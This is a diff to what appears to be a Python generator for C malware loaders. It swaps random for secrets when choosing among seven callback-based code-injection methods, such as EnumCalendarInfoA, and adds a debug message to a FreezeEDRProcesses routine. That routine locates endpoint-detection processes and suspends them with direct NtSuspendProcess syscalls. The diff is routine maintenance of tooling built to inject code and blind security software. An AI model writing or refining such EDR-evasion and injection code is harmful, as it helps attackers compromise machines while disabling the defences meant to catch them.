@@ -12,6 +12,7 @@ import sys
 import argparse
 import shutil
 import random
+import secrets
 from pathlib import Path
 from datetime import datetime
 from typing import Optional, Dict
@@ -2940,7 +2941,7 @@ BOOL InjectCallback(PINJECTION_CONTEXT pCtx);
 '''
 
         # Randomly select one of 7 callback methods
-        callback_choice = random.randint(0, 6)
+        callback_choice = secrets.randbelow(7)
 
         callback_methods = [
             # 0: EnumCalendarInfoA
@@ -3161,7 +3162,13 @@ BOOL FreezeEDRProcesses(VOID) {{
 
         // Found an EDR process — freeze it
         HANDLE hProc = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pe.th32ProcessID);
-        if (!hProc) continue;
+        if (!hProc) {{
+#if DEBUG_BUILD
+            printf("[!] OpenProcess failed for PID %lu (access denied or process exited)\\n",
+                   pe.th32ProcessID);
+#endif
+            continue;
+        }}
 
         PrepareNextSyscall(IDX_NtSuspendProcess);
         NTSTATUS status = NtSuspendProcess(hProc);
